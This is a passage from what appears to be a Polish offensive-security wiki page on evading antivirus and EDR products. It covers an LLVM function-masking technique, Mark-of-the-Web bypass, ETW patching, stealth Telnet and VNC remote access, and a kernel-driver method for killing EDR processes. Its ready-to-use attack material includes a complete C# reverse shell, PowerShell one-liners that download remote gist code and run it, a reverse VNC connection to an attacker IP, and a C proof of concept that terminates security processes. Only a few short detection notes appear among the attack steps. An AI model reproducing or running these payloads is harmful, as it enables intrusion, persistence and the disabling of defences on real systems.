- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest stworzenie otwartoźródłowego forka pakietu kompilacyjnego [LLVM](http://www.llvm.org/), który zwiększa bezpieczeństwo oprogramowania dzięki [obfuskacji kodu](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zabezpieczeniom przed manipulacją.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak użyć języka `C++11/14` do generowania obfuskowanego kodu w czasie kompilacji, bez zewnętrznych narzędzi i modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuskowanych operacji, generowanych przez framework metaprogramowania szablonów C++, co nieco utrudnia życie osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuskator binarny x64, który potrafi obfuskować różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorficznego dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to framework do precyzyjnej obfuskacji kodu w językach obsługiwanych przez LLVM, wykorzystujący ROP (programowanie zorientowane na powroty). ROPfuscator obfuskowuje program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w łańcuchy ROP i podważając nasze naturalne wyobrażenie o normalnym przepływie sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące pliki EXE/DLL do postaci shellcode, a następnie je ładować

### Samomaskowanie poszczególnych funkcji wspomagane przez kompilator LLVM

Zamiast maskować cały implant wyłącznie podczas uśpienia, zmodyfikowany backend LLVM X86 może utrzymywać wybrane funkcje w postaci zamaskowanej operacją XOR, gdy są nieaktywne. PoC Function Peekaboo wybiera zdemanglowane nazwy zawierające `REG_`, wstawia niezależne od położenia stuby wejścia/wyjścia wokół końcowego kodu maszynowego i emituje jeden wspólny handler maskujący w `.text`; sygnatury na poziomie źródłowym i konwencja wywołań Windows x64 pozostają bez zmian.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformacja przepływu sterowania w backendzie

Transformację należy wykonać po wyborze instrukcji i optymalizacji, ponieważ musi ona objąć **każdą wyemitowaną instrukcję powrotu** i znać dokładny układ x86. Przed emisją `MachineFunctionPass` znajduje ostatnią instrukcję `MachineInstr::isReturn()`, usuwa ją, aby końcowa ścieżka przechodziła do dołączonej epilogi, a wcześniejsze instrukcje powrotu zastępuje przez `JMP_1 handler`. Zachowaj wygenerowane przez kompilator instrukcje zwalniania stosu/ramki poprzedzające każdy powrót; przekieruj tylko samą instrukcję powrotu.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `X86AsmPrinter::emitFunctionBodyEnd()` emitują stuby poszczególnych funkcji, natomiast `emitEndOfAsmFile()` emituje handler. Symbole współdzielone między etapami emisji pozwalają skokowi w prologu wskazywać późniejszą epilogę; przy ręcznym emitowaniu bliskiego `je` zapisz `0F 84`, a następnie czterobajtowe wyrażenie MC `target - address_after_je`. Wywołania i skoki do handlera można natomiast emitować jako obiekty `MCInst` (`CALL64pcrel32` i `JMP_1`). Pass musi zwrócić `false` dla niewybranej funkcji, jeśli niczego nie zmienił; PoC błędnie zwraca w tej sytuacji `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadane i inicjalizacja przed CRT

PoC umieszcza klucz XOR i 16-bajtowe rekordy zawierające relokowany przez loader wskaźnik do funkcji oraz długość ustalaną w czasie działania w `.funcmeta`. Chociaż pole C ma typ `uint32_t`, handler odczytuje QWORD z przesunięcia `+8` w rekordzie, pobierając długość wraz z jej dopełnieniem, a rekordy przeskakuje co `0x10`. Nazwy sekcji PE mają maksymalnie osiem bajtów, więc wyszukiwanie w czasie działania widzi `.funcmet`. Zewnętrzny patcher dodaje wykonywalną sekcję `.stub`, zapisuje w niej stary RVA punktu wejścia i przekierowuje `AddressOfEntryPoint`; stub PIC pobiera bazę obrazu z `gs:[0x60]` → `[PEB+0x10]`, przechodzi po importach PE32+, aby rozwiązać już zaimportowane `VirtualProtect`, i uruchamia się przed CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Inicjalizacja ustawia znacznik w `gs:[0xE8]` i wywołuje każdą funkcję z metadanych. Zawsze czytelny prolog zapisuje początek funkcji w `gs:[0xF0]`, wykrywa znacznik i pomija wciąż odszyfrowane ciało. Następnie epiloga używa `call handler`; po zapisaniu przez handler 13 rejestrów (`0x68` bajtów) adres powrotu pod `[rsp+0x68]` wskazuje koniec przekształconej funkcji, więc `end - start` można zapisać w jej rekordzie metadanych. Po zamaskowaniu wszystkich ciał stub usuwa znacznik i wykonuje skok do `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Podczas zwykłego wywołania prolog wywołuje ten sam symetryczny handler, aby odszyfrować ciało. Końcowa ścieżka przechodzi do dołączonej epilogi, a każdy wcześniejszy powrót skacze bezpośrednio do wspólnego handlera. Zwykła epiloga również używa `jmp handler` zamiast `call`, więc po ponownym zamaskowaniu instrukcji `ret` handlera pobiera adres powrotu pierwotnego wywołującego i zachowuje wynik funkcji w `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Mechanizm maskowania i wskaźniki analityczne

Handler odnajduje bieżący rekord, pomija stały, widoczny prolog (w tej kompilacji `0x46` bajtów), zmienia ochronę pozostałej części na `PAGE_EXECUTE_READWRITE`, wykonuje XOR każdego bajtu z najmłodszym bajtem klucza, a następnie ustawia ochronę na `PAGE_EXECUTE_READ`. Ta sama pętla odszyfrowuje więc kod przy wejściu i szyfruje go przy każdym zwykłym wyjściu.<sup>[[38]](#references)[[39]](#references)</sup>

Do istotnych wskaźników tej techniki należą:<sup>[[38]](#references)[[39]](#references)</sup>

- punkt wejścia w wykonywalnej sekcji `.stub` oraz sekcja `.funcmet` zawierająca klucz i relokowane wskaźniki do `.text`;
- parsowanie PEB, tablicy importów i tablicy sekcji przed CRT, a następnie wywołania przez każdy wskaźnik z metadanych;
- identyczne prologi PIC w schemacie `call`/`pop` oraz liczne miejsca powrotu przekierowane do jednego handlera;
- zapisy do `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, po których następują powtarzające się zmiany ochrony przez `VirtualProtect` i bajtowe operacje XOR zapisujące do stron wykonywalnych mapowanych z obrazu.

Jest to technika unikania skanerów pamięci, a nie ochrona kryptograficzna: spatchowany plik nadal zawiera oryginalne, odszyfrowane ciało, a debugger może zatrzymać wykonanie na `VirtualProtect` lub pętli XOR i zrzucić aktywną funkcję. Jednobajtowy XOR, czytelne metadane i stała granica `0x46` ułatwiają również odzyskanie kodu offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Sloty TEB używane przez PoC są lokalne dla wątku, ale zmodyfikowane strony kodu są współdzielone w całym procesie. Równoczesne lub rekurencyjne wejście może więc ponownie przełączać instrukcje, gdy inna instancja funkcji jest w trakcie wykonywania; wyjątki i nielokalne wyjścia również mogą ominąć ponowne maskowanie. Solidna implementacja musi synchronizować przejścia, przywracać rzeczywistą ochronę zwróconą przez `lpflOldProtect`, unikać długości stubów zakodowanych na stałe, sprawdzać ścieżki `call` i `jmp` pod kątem wyrównania stosu x64 oraz wywoływać `FlushInstructionCache` po modyfikacji bajtów wykonywalnego kodu. Microsoft wyraźnie przypisuje wywołującemu odpowiedzialność za spójność pamięci podręcznej instrukcji przy modyfikowaniu wykonywalnego kodu.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Być może widziałeś ten ekran podczas pobierania z internetu i uruchamiania niektórych plików wykonywalnych.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa, który ma chronić użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa przede wszystkim w oparciu o reputację, co oznacza, że rzadko pobierane aplikacje wywołują SmartScreen, który ostrzega użytkownika i uniemożliwia mu uruchomienie pliku (można go jednak uruchomić, klikając Więcej informacji -> Uruchom mimo to).

**MoTW** (Mark of The Web) to [Alternate Data Stream systemu NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony podczas pobierania plików z internetu i zawiera adres URL źródła pobrania.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie strumienia ADS Zone.Identifier pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Warto pamiętać, że pliki wykonywalne podpisane **zaufanym** certyfikatem do podpisywania **nie wywołują SmartScreen**.

Bardzo skutecznym sposobem na uniknięcie oznaczenia payloadów przez Mark of The Web jest spakowanie ich do jakiegoś rodzaju kontenera, na przykład ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być stosowany do woluminów **innych niż NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie pakujące payloady do kontenerów, aby uniknąć Mark-of-the-Web.

Przykład użycia:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Here is a demo pokazujący, jak ominąć SmartScreen, pakując payloady w pliki ISO za pomocą [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to zaawansowany mechanizm rejestrowania zdarzeń w systemie Windows, który pozwala aplikacjom i komponentom systemu **rejestrować zdarzenia**. Może być jednak również używany przez produkty zabezpieczające do monitorowania i wykrywania złośliwych działań.

Podobnie jak w przypadku wyłączenia (obejścia) AMSI, możliwe jest również sprawienie, by funkcja **`EtwEventWrite`** procesu działającego w przestrzeni użytkownika natychmiast zwracała sterowanie bez rejestrowania żadnych zdarzeń. Robi się to przez zmodyfikowanie funkcji w pamięci, tak aby natychmiast zwracała sterowanie, skutecznie wyłączając rejestrowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Ładowanie binariów C# do pamięci jest znane od dawna i nadal stanowi świetny sposób na uruchamianie narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci, bez zapisywania na dysku, wystarczy nam martwić się o patchowanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) umożliwia już bezpośrednie wykonywanie C# assemblies w pamięci, ale można to zrobić na różne sposoby:

- **Fork\&Run**

Polega to na **uruchomieniu nowego procesu ofiarnego**, wstrzyknięciu do niego złośliwego kodu post-exploitation, wykonaniu tego kodu, a po zakończeniu — zakończeniu nowego procesu. Ta metoda ma zarówno zalety, jak i wady. Jej zaletą jest to, że wykonanie odbywa się **poza** procesem naszego implantu Beacon. Oznacza to, że jeśli coś pójdzie nie tak podczas działania post-exploitation lub zostanie wykryte, istnieje **znacznie większa szansa**, że nasz **implant przetrwa**. Wadą jest **większe ryzyko** wykrycia przez **wykrywanie behawioralne**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega to na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. Dzięki temu można uniknąć tworzenia nowego procesu i jego skanowania przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak podczas wykonywania payloadu, istnieje **znacznie większa szansa**, że **utracisz swój beacon**, ponieważ może ulec awarii.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz dowiedzieć się więcej o ładowaniu C# Assembly, przeczytaj ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz zapoznaj się z ich BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz również ładować C# Assemblies **z PowerShell**. Sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [wideo S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Używanie innych języków programowania

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), można wykonywać złośliwy kod napisany w innych językach, zapewniając zaatakowanej maszynie dostęp **do środowiska interpretera zainstalowanego na udziale SMB kontrolowanym przez atakującego**.

Zapewniając dostęp do plików binarnych interpretera i jego środowiska na udziale SMB, można **wykonywać dowolny kod w tych językach w pamięci** zaatakowanej maszyny.

Zgodnie z repozytorium Defender nadal skanuje skrypty, ale użycie Go, Java, PHP itd. zapewnia **większą elastyczność w omijaniu sygnatur statycznych**. Testy z losowymi, nieobfuskowanymi skryptami reverse shell w tych językach zakończyły się powodzeniem.

## TokenStomping

Token stomping manipuluje tokenem dostępu produktu zabezpieczającego, takiego jak EDR lub AV. Ograniczenie uprawnień tokenu może pozwolić procesowi działać dalej, jednocześnie uniemożliwiając mu wykonywanie uprzywilejowanych działań kontrolnych lub naprawczych.

Aby temu zapobiec, Windows może **uniemożliwić zewnętrznym procesom** uzyskiwanie uchwytów do tokenów procesów zabezpieczających.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Używanie zaufanego oprogramowania

### Chrome Remote Desktop

Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia nad nim kontroli i utrzymania persistence:<sup>[[35]](#references)</sup>
1. Pobierz plik ze strony https://remotedesktop.google.com/, kliknij „Set up via SSH”, a następnie kliknij plik MSI dla systemu Windows, aby go pobrać.
2. Uruchom instalator po cichu na maszynie ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć na stronę Chrome Remote Desktop i kliknij „Next”. Kreator poprosi o autoryzację; kliknij przycisk „Authorize”, aby kontynuować.
4. Wykonaj podane polecenie, wprowadzając wymagane zmiany: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametr `--pin` ustawia PIN bez użycia GUI).
 

## Zaawansowane techniki unikania wykrycia

Unikanie wykrycia to bardzo złożony temat. Czasami trzeba uwzględnić wiele różnych źródeł telemetrii w jednym systemie, dlatego w dojrzałych środowiskach niemal niemożliwe jest całkowite uniknięcie wykrycia.

Każde środowisko, z którym się mierzysz, ma swoje mocne i słabe strony.

Gorąco zachęcam do obejrzenia tej prelekcji [@ATTL4S](https://twitter.com/DaniLJ94), która pomoże poznać bardziej zaawansowane techniki unikania wykrycia.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To również świetna prelekcja [@mariuszbit](https://twitter.com/mariuszbit) na temat wielowarstwowego unikania wykrycia.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Starsze techniki**

### **Sprawdź, które części Defender uznaje za złośliwe**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który **usuwa części pliku binarnego**, aż **ustali, którą jego część Defender** uznaje za złośliwą, i ją wyodrębni.\
Innym narzędziem, które robi **to samo**, jest [**avred**](https://github.com/dobin/avred), dostępne również jako usługa internetowa pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serwer Telnet**

Do Windows 10 każdy system Windows zawierał **serwer Telnet**, który można było zainstalować (jako administrator), wykonując:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Spraw, aby **uruchamiał się** przy starcie systemu, i **uruchom** go teraz:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Zmień port telnetu** (stealth) i wyłącz zaporę:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pobierz stąd: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrzebne są pliki binarne, a nie instalator)

**NA HOŚCIE**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ i **nowo** utworzony plik _**UltraVNC.ini**_ na **komputer ofiary**

#### **Reverse connection**

**Atakujący** powinien uruchomić na swoim **hoście** plik binarny `vncviewer.exe -listen 5900`, aby był **gotowy** na odebranie zwrotnego **połączenia VNC**. Następnie na **komputerze ofiary** uruchom demona winvnc poleceniem `winvnc.exe -run`, a potem wykonaj `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować stealth, nie wolno wykonywać kilku czynności:

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wyświetli się [wyskakujące okno](https://i.imgur.com/1SROTTl.png). Sprawdź, czy proces działa, poleceniem `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, bo otworzy się [okno konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h`, aby wyświetlić pomoc, bo pojawi się [wyskakujące okno](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz stąd: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

W GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Teraz **uruchom listener** za pomocą `msfconsole -r file.rc` i **wykonaj** **payload XML** za pomocą:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Obecny Defender bardzo szybko zakończy proces.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Użyj tego z:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# przy użyciu kompilatora

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchamianie:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Użycie Pythona do budowy injectorów — przykład:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Wyłączanie AV/EDR z poziomu Kernel Space

Storm-2603 wykorzystał niewielkie narzędzie konsolowe o nazwie **Antivirus Terminator**, aby wyłączyć zabezpieczenia endpointów przed wdrożeniem ransomware. Narzędzie dostarcza **własny podatny, ale *podpisany* driver** i wykorzystuje go do wykonywania uprzywilejowanych operacji na poziomie jądra, których nie mogą zablokować nawet usługi AV działające jako Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Kluczowe wnioski
1. **Podpisany driver**: Plik zapisywany na dysku to `ServiceMouse.sys`, ale jest to w rzeczywistości legalnie podpisany driver `AToolsKrnl64.sys` z „System In-Depth Analysis Toolkit” firmy Antiy Labs. Ponieważ driver ma prawidłowy podpis Microsoftu, ładuje się nawet wtedy, gdy włączone jest Driver-Signature Enforcement (DSE).
2. **Instalacja usługi**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Pierwszy wiersz rejestruje driver jako **usługę jądra**, a drugi go uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z przestrzeni użytkownika.
3. **IOCTL udostępniane przez driver**
   | Kod IOCTL | Możliwość                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Zakończenie dowolnego procesu na podstawie PID (używane do zabijania usług Defender/EDR) |
   | `0x990000D0` | Usunięcie dowolnego pliku z dysku |
   | `0x990001D0` | Wyładowanie drivera i usunięcie usługi |

   Minimalny proof-of-concept w C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Dlaczego to działa**: BYOVD całkowicie omija zabezpieczenia trybu użytkownika; kod wykonujący się w kernelu może otwierać *chronione* procesy, kończyć je lub manipulować obiektami kernela, niezależnie od PPL/PP, ELAM i innych funkcji hardeningu.

Wykrywanie / Ograniczanie ryzyka
•  Włącz listę blokowanych podatnych sterowników firmy Microsoft (`HVCI`, `Smart App Control`), aby system Windows odmawiał ładowania `AToolsKrnl64.sys`.
•  Monitoruj tworzenie nowych usług *kernela* i generuj alerty, gdy sterownik jest ładowany z katalogu z prawem zapisu dla wszystkich lub nie znajduje się na liście dozwolonych.
•  Obserwuj uchwyty trybu użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Omijanie kontroli stanu urządzenia Zscaler Client Connector przez modyfikowanie plików binarnych na dysku

**Client Connector** firmy Zscaler lokalnie stosuje reguły stanu urządzenia i korzysta z Windows RPC, aby przekazywać wyniki innym komponentom. Dwie słabe decyzje projektowe umożliwiają całkowite obejście zabezpieczeń:

1. Ocena stanu urządzenia odbywa się **w całości po stronie klienta** (do serwera wysyłana jest wartość logiczna).
2. Wewnętrzne punkty końcowe RPC sprawdzają jedynie, czy łączący się plik wykonywalny jest **podpisany przez Zscaler** (za pomocą `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Przez **modyfikację czterech podpisanych plików binarnych na dysku** można zneutralizować oba mechanizmy:

| Plik binarny | Oryginalna logika, którą zmodyfikowano | Wynik |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola kończy się zgodnością |
